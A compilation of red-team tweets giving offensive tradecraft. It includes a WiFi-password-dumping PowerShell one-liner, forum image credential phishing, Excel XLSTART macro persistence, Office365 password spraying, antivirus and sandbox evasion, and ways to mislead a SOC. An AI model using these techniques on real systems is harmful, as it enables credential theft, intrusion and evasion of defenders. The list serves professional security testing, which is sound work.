@und3rf10w found that if you kill the threads in Windows Defender it won't detect anything whilst the process still runs. He also did bits of testing against Carbon Black. Good read! Extension of Phant0m http://www.insomniacsecurity.com/2017/08/27/phant0m.html
Need user IPs without noisy hunting scripts? Pull homeDirs from AD, pwn share, extract host from %USERPROFILE%\Links\Desktop.lnk
3snake lets you dump sshd and sudo related strings to obtain further credentials on rooted servers. https://github.com/blendin/3snake
@evilcos has gotten ZoomEye back up! If you've not used ZoomEye I recommend trying it out. You might get differing results to existing tools! https://www.zoomeye.org/

If you're using cloud infrastructure for listening posts / redirectors it's worth checking the IP against known black lists. Just so that it doesn't end up tainting the reputation of associated domains!

Most Windows deployment tutorials recommend hard-coding server or domain (admin) credentials in the PXE boot environment. Find the WDS server, send it a DHCP broadcast, and download the TFTP capsule. From @swiftonsecurity

CACTUSTORCH weaponises James Forshaw's Dotnet2js research. Allows shellcode execution in JS and HTA files as well as an alternate for Macros. This is being used in the wild and you should know about it! It's proved useful in EDR cases too! https://github.com/mdsecactivebreach/CACTUSTORCH
Domain Admins is not the only privileged group. Account Operators, Backup Operators, DNS Admins and more exist. Read up with @pyrotek3 https://adsecurity.org/?p=3700

Backup images on disk with world readable access rights. I see this ALL THE TIME. Check out https://rastamouse.me/2018/02/vhd-to-da/ by @_rastamouse teaching us how to read VHD without transferring 50 GB.
Renaming Mimikatz to Mimidogz will bypass China common security products such as 360. :)

Your customers security is dependent on yours. With that requirement, I recommend writing a PowerShell script that makes a mobile push to your phone every time you unlock or startup your machine. Similar for SSH onto servers.

MSSQL Domain user -> public role -> UNC leak -> relay or crack using eg. Inveigh -> suddenly born as a new man! https://github.com/NetSPI/PowerUpSQL other cool bits in here worth noting. I do OS admin to SYSADMIN a lot! https://github.com/NetSPI/PowerUpSQL

Look for open S3 buckets using https://github.com/sa7mon/S3Scanner I found 1400 buckets in about 1 hour. Good practice to make sure your client isn't vulnerable to such attacks and if In red team you might be able to use it to serve payload stages or create waterhole attacks. In total I found over 6000.

Phish creds on target sites. Forums and other areas let you post image links. [img]url/cat.png[/img] for example. Use https://github.com/vysec/basicAuth , set PNG as a PHP execution extension. Embed that PNG and whenever someone visits the page it will prompt for credentials.

Why are privileged / admin user code execution vulnerabilities a thing in web app reports? Because if you're privileged and can execute code on a web app, you can use it to Pivot into segments, extract secrets from the box, intercept comms, and all that good stuff.

The supreme art of war is to subdue the enemy without fighting. In my opinion, get to the goal without having to privesc and move laterally or compromise unnecessary assets or cause collateral damage and noise.

Stuck against some EDR, or just want to add some complexity to your payload to better train the blue team? Check out SharpShooter by @domchell, a payload generation framework. https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/

List RDP connections history with @3gstudent https://github.com/3gstudent/List-RDP-Connections-History â€¦ Useless in times where you don't have a GUI. I'd combine it with cmdkey to see what's in vault to figure out where the user may have access :) #redteam #pentest #security
If DMARC policy is set to the root domain, but not sub domains, check if subdomain policy is applied. If not, spoof from arbitrary subdomains instead :)

SOC is looking for low user/access count new domains that haven't been seen before and you can't domain front due to RFC2616 proxy? When doing the phish, add invisible image links to your C2 domain so that multiple users will have loaded the C2 domain before use. By the time the domain is used, it won't be a low number of users who have accessed the domain, it can be like 20. Then when the C2 goes in, it's no longer new and low user count. And just to be safe, I'd load unused domains too, like ones that don't belong to you. So that the SOC can go on a wild goose chase even if they think they know what you're doing. Even better, load a JS snippet that just keeps reloading resources from the websites so that there's more hit count per user :D

Check out goaccess -> apt-get install goaccess. Then goaccess -f /var/log/nginx/access.log Pretty cool! Now you can see who's hitting your redirector and what they're grabbing at all times in live view? Good for red team dash boards.

Sandboxes run Macros without prompting right? What if you wrote your Macro to check that it's set to run without prompting and don't run? :) only run if it's on enable content setting... which is more likely to be observed in a real environment.

Combine DomLink https://vincentyiu.co.uk/domlink-automating-domain-discovery/ â€¦ with zgrep -f doms-filter.txt scans.gz | awk -F\"name\":\" '{print $2}' | awk -F"\",\"type '{print $1}' | tee -a doms-subs.txt to get a nice list of subdomains for every DomLink recovered associated domain? :)
Ton of injection techniques implemented here for reference. https://github.com/rootm0s/Injectors â€¦ Although mainly in cpp :)

If you HAVE to spray for creds, use Kerberos spraying as pointed out by @ropnop that the level of auditing is far less by default and does not log invalid attempts. https://github.com/ropnop/kerberos_windows_scripts

Not enough space for a full payload and want to avoid staging in an LNK format? Try @felixw3000 guide on embedding larger payloads into self extracting LNK files. https://uperesia.com/booby-trapped-shortcut â€¦

Stuck on finding benign or of phishing context for target? Try out https://www.goodemailcopy.com/ for some inspirations! https://greatemailcopy.com/ and https://reallygoodemails.com/ and https://codepen.io/reallygoodemails/

Need a way to manage high-level and performed actions per day? @xmind might be a good tool to help you do that. You can arrange per day on major actions performed, you can also put notes into it. https://www.xmind.net/zen/

Builtwith is pretty useful for linking domains using trackers. It also does Shared IP / infrastructure links and displays technologies used. https://builtwith.comthanks to @Jhaddix for pointing it out in his @Bugcrowd talk!

List Chrome bookmarks with one line: type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type". Thank @francisacer1 for the path to Bookmarks.bak :D

Want to find out if the current network has an external exposed interface? Eg. Wireless networks? An easy way is to visit https://ifconfig.co/port/80 on port 22,80,443 for a quick idea. You might find that your current network has another way in!
Logging the date and time is really important. Go to http://bashrcgenerator.com and generate a fancy looking, and useful time on your terminal for bash. I combine this with script ~/OPNAME_DATE.txt.

Recruiters adding you on LinkedIn? Make the most out of it! 1) Recruitment / Job templates for use in campaigns, 2) Job site you can clone / reference when making your own, 3) Second and third degree connections to target organisations!

Easy way to get Microsoft tenant ID https://login.windows.net/companyname.onmicrosoft.com/.well-known/openid-configuration. Not sure why when I Google Tenant ID, people censor it out when it's publicly accessible without any authentication. Bunch of interesting output from the request anyhow.

WPA2 PSK can be cracked on Hashcat too, just in case you were not aware. All you do is make cap2hccapx https://github.com/hashcat/hashcat-utils â€¦ then convert the handshake CAP file to HCCAPX then crack it in Hashcat mode 2500 :)
WHOIS Protection in place on domains? Try get WHOIS information from the Autonomous System Number then use that to perform reverse WHOIS to find additional domains. https://dnslytics.com/bgp/us
Hashcat doesn't run through special characters if you use -a 3 for passwords of length < 6. Use -a 3 -1 ?u?l?s ?1?1?1?1?1 instead.

Need to Spray Office365? Use https://bitbucket.org/grimhacker/office365userenum. Tried and tested this tool and works really fast and well in Python. Just do --threads 3000 and --password Welcome1. As all operators know, you don't have time to be testing tools in the middle of a gig. :)

Running a long gig? Use CloudFlare certificate that lasts 15 years instead of LetsEncrypt. LetsEncrypt lasts like 3 months and requires renewal. If you're domain fronting you don't want to be changing and updating certs to prevent 502 errors.

Against Palo Alto? Default exemptions by @n00py1 https://pastebin.com/raw/Fa0nqg5g. Domain Fronting compatible list at https://github.com/vysec/DomainFrontingLists/blob/master/CloudFront-SSL-PA-Exempt.txt

If you get errors RDPing to a Windows 10 box from Mac OSX or Windows 7, try a Windows 10 box :). Same vice versa with Windows 10 box RDPing to Windows 7 boxes you might have issues, so try using a Windows 7 box. Recent CREDSSP security patch screws it.

If you're new to Red Team, or are performing a complex series of campaigns and attacks then I recommend using a WHITEBOARD. Yes, a whiteboard. It helps to draft out attacks, list out infrastructure, lets you visualize your campaign chain.

One liner to grab all cleartext WiFi passwords: (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}

Don't spend too much time fixated on a rabbit hole. In a CTF you know you can â€œtry harderâ€ but in real life you often have to kick back and rethink what you're doing. There's so many times where I've found a way to pivot and continue after some good rest.
Use copy with the /z flag to make resumable file transfers on Windows. @guyrleech

Technical teams often pride themselves on technical capabilities and complexity. In real operations, less is more. The more simple and effective a solution or campaign is, the better. You most probably don't need that mega complex payload or exploit path.

Have a low privileged Office365 account? Pivot over to portal.azure.com after logging in and you can access the Azure AD. If they're syncing AD you suddenly get to view all the groups. Also check out Azure CLI. From @ustayready's @WWHackinFest talk!

Geographical TTPs should be kept in mind. TTPs that may not be as effective in one location may work wonders in another. Consider defensive solutions, legislation, export controls, compliance etc on that organization within different regions.

Effective TTPs can differ depending on industry or organization size. An example may be that SMEs may be more likely vulnerable to a credential stuffing attack compared to a global financial organization because less policies around password rotation and expiry.
Not sure what countries your target operates in? Find out where all their servers are at least! Automate all the IP -> lat long and then use a Mapping framework to visualize. Works great.
VPNHunter can be used to automatically map out some common services such as VPN and dependent cloud services. http://VPNHunter.com
If you're running C2 Infrastructure, at least age the domain, build reputation, and SERVE SOME CONTENT on the web root. Oh yeah, don't forget to use VALID CERTIFICATES also.

When working with Google Drive documents, if it asks you to request permission, you can try. However, you can also try sticking /pubhtml at the end to see if they've published a copy that you can view.

Set HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0, to allow multiple sessions on a server per user. This is useful if you want to login to the jump-host, but that guy's just on all-day-long... ðŸ˜¶

When placing Excel Macro backdoors into Excel startup, you don't have to name it Personal.xlsb, you can also call it "Draft" with no extension. It'll still start up upon opening of Excel.... Bonus point for sticking it into Roaming profile. Insert any Macro doc into:c:\users\%username%\appdata\roaming\microsoft\excel\xlstart\ There won't be any Macro prompts either because it's a trusted location by default.

Can't find any associated domains due to whois privacy? Try this! If they use ProofPoint or other mail filtering solutions, you can try to do reverse MX lookup for that dedicated instance and you can find other tenants who are related ðŸ˜Š

If SharpHound doesn't work with --DomainController against the DC IP, try with the domain FQDN such as msp.local. (e.g. sharphound -c All -d msp.local --DomainController msp.local) @SecurityTube and Mysterious Rex!
JAMF Pro appears to store computer account password in cleartext in System Keychain. Great if you need an account to Kerberoast with and have no other set of credentials available. Smiling face

Prepare various tried and tested fully undetected payloads beforehand, because you may be more prone to making mistakes if you are having to figure out how to bypass basic AV in the middle of a job with pressure from the blue team. #cyber #operations #redteam
Need to proxy  Linux tools? Proxychains4. Need to proxy Windows tools like ADExplorer or Remote Desktop? Try out Proxycap, Proxifier. #cyber #operations #redteam

When performing a physical intrusion, get a body cam, have a team on the line, get your fake get out of jail letters and fake evidences ready, get “manager” bob’s number ready in case security needs to chat, make sure bob knows what his employee ID is. #cyber #red

Perform easy phishing campaign and obtain a list of users who clicked. Send a follow up email from a training platform and ask them to perform their awareness training by launching an application. Idea is that multi-stage phishing is more convincing. #cyber #redteam

Performing OSINT and obtain contextual information and terms that should only be known by internal employees? Leverage it in the campaign as it will gain the user’s trust and they should be more inclined to follow the required actions. #cyber #redteam

Use various Passive and Active subdomain databases and merge the results into one list. For example, Amass, R7dns, Subfinder, etc all have slightly varying results. Combining them provides you with a more comprehensive list of targets. #redteam #cyber
Use gau or waybackurls fed into httpx to identify sensitive files, URLs, and more. Old forgotten URLs may yield critical web app vulnerabilities.   https://github.com/lc/gau #cyber #redteam

In a slow network and need to get over the fact CobaltStrike C2 May be slow or you only have a Socks4 proxy? Use Chisel for an alternative channel backdoor connection. https://github.com/jpillora/chisel It’s fast and uses websockets. #cyber #redteam

Hashcat Automation Tool can help when you don’t want to remember or type up the entire cracking methodology each time you need to crack hashes. It helps to speed up the process and add consistency. https://github.com/sp00ks-git/hat #cyber #redteam

Deduplicating large wordlists is no easy feat. @nil0x42  has a highly optimised c code project to deduplicate such wordlists which are then used in password cracking. https://github.com/nil0x42/duplicut #cyber #redteam

Up against a long password length requirement? The organization has good password guidance and everyone’s using passphrases? Try out https://t.co/wKVA3cZoGt?amp=1 by @initstring   with detailed instructions on how to generate and use passphrase wordlists. #cyber #redteam

Password Analysis and Cracking Kit is a fantastic tool. You can use it to analyse trends and get common password formats identified in cracked passwords. Analyse and grab the most common masks and bruteforce the entire space. https://github.com/iphelix/pack #cyber #redteam

Get a Windows error code after running a command? Try using “net helpmsg num” to get a verbose description to better understand what the problem may be. I’ve preferred this approach over googling. #cyber #redteam
STATUS_PASSWORD_MUST_CHANGE when trying an AD account? Use “smbpasswd -r domain.fqdn -U username” to change the password so you can use the account. #cyber #redteam
Need to convert a SOCKS proxy into a VPN TAP/TUN adapter? Try out NetchX. https://github.com/NetchX/Netch works great to tunnel all your traffic in using just a SOCKS proxy. #redteam #cyber
Search Office365 Sharepoint for all files that a user has access to using Bing for sensitive files. @mugundhanbalaji
“Su: must be run from a terminal”. Bypass it by running “/usr/bin/script -qc /bin/bash /dev/null”. #cyber #redteam
Trying to add new entries to a file, but want to check for duplicates? @TomNomNom has a great tool called 'anew'. https://github.com/tomnomnom/anew
Identify if a certain domain is hosted on s3 bucket by requesting ‘/%C0’. It’ll spit out a 400 bad request if it’s an S3 bucket with a similar message as shown in the screenshot. #redteam #cyber
Find-DomainPropertyObjectOutlier in Powerview. Use it to find hidden secrets inside AD Attributes. https://t.co/MxQqYckFOt?amp=1 @shantanukhande

Escalate privileges on a Windows system if you have any of the following privileges. SeImpersonate, SeAssignPrimary, SeTcb, SeBackup, SeRestore, SeCreateToken, SeLoadDriver, SeTakeOwnership, SeDebug @elc0rr3Km1n0s
Identify if a certain domain is hosted on s3 bucket by requesting ‘/%C0’. It’ll spit out a 400 bad request if it’s an S3 bucket with a similar message as shown in the screenshot. #redteam #cyber

Escalate privileges on a Windows system if you have any of the following privileges. SeImpersonate, SeAssignPrimary, SeTcb, SeBackup, SeRestore, SeCreateToken, SeLoadDriver, SeTakeOwnership, SeDebug @elc0rr3Km1n0s

Windows Defender Application Control bypass using visualuiaverifynative.exe and serialised objects. @bohops.   Walks us through on how to use this technique. https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/… #redteam #cyber

CVE-2020-16938 allows privileged file read by EVERYBODY according to @jonasLyk  You can PoC using 7zip and navigating to the device path \\.\PhysicalDevice0\Basic data partition.img\Windows\System32\Config\ #redteam #cyber
Shift and right click in Remote Desktop is the best shortcut I use to get a command prompt.

Directory discovery for all your URLs in one command, formatted to a nice HTML file for browsing. You can try other formats for grepping etc: ffuf -w targets-alive.txt:URL -w wordlist.txt -u URL/FUZZ -mc 200,403 -o targets-report.html -of html

Recently I had a situation where the Set-ADObject command was not working well, and the object was not being updated. I worked around it by using ADExplorer proxied into the environment. ADExplorer's edit functionality generally works really well for making direct changes. #RedTeam #Cyber

Looking for login credentials? Don't forget to try default credentials other than admin:admin -> https://github.com/ihebski/DefaultCreds-cheat-sheet. A fantastic cheat sheet containing major default credentials to try for various products.

Trying to manage Hashcat jobs through a GUI? Try out https://github.com/f0cker/crackq by @f0cker_. It has a fancy GUI interface, cracked password analytics, and email notifications on successful cracking. Demo video: https://f0cker.github.io/crackq/CrackQDemo.mp4

Domain Admins are powerful, but what if you have access to roles such as DNS Admin, Backup Operators, Schema Admins etc? @Cube0x0 has a fantastic post over at https://cube0x0.github.io/Pocing-Beyond-DA/ which highlights methods of exploiting various roles to obtain further access. Sean Metcalf also has documented good work over at https://adsecurity.org/?p=3700 by @PyroTek3

Using Cloud Resources for various Red Team attacks and exploitation https://tldrsec.com/blog/lesser-known-aws-attacks/. Lesser known AWS attacks by Scott Piper goes over Using Stack Sets for phishing. Predicting naming patterns for resources. Account lateral movement. Data Exfiltration through RDS snapshot sharing and DNS.

Key Decoder may be useful in a Red Team engagement if you have temporary access to a physical key and need to decode the mechanical key. https://play.google.com/store/apps/details?id=com.keydecoder. I recently had a Red Team engagement where I tried to convince that client that putting keys on display was not a good idea even if they are bolted to the wall.

SSH Agent Forwarding can be exploited to advance your presence on a network without SSH keys or passwords. @int0x08 has an example command snippet available at https://gist.github.com/int0x80/9e7b096684dd37c478198404d171aa3f. Great for when you have a shell but no credentials.
Found GitLab but no credentials? That pesky sign-in page is blocking you off? Try navigate to /explore or /explore/snippets to see if there's anything useful.

ProjectDiscovery have a tool called Nuclei which has constantly community-updated signatures which help to quickly identify the low hanging fruit and fingerprint a perimeter if you don't want to go full on vulnerability scanner: https://github.com/projectdiscovery/nuclei

Pwndrop is a customized web and webdav server that can be used to serve documents and payloads with a few extra features. @kgretzky made a fantastic GUI and its super easy to use! https://github.com/kgretzky/pwndrop. Video at https://www.youtube.com/watch?v=e3veSyIFvOE

Hashcat supports sessions and resuming, so you can pause a job and get back to it. Use --session <name>, then --restore --session <name> to allow for pause and resume of the Hashcat cracking session. https://hashcat.net/wiki/doku.php?id=restore

Search through Git logs for passwords by @int0x08 https://gist.github.com/int0x80/79ef32fdf0a248c21788b5d83158a202. One liner command to go through Git Reflog and do Git diff looking for the term 'password'.

Found a repository and want to check historical commits? Take the github URL and change the github.com to github.githistory.xyz, then you can use left and right arrow keys to visualize the changes to the code. For example: https://github.githistory.xyz/ExistentialAudio/BlackHole/blob/master/BlackHole/BlackHole.h
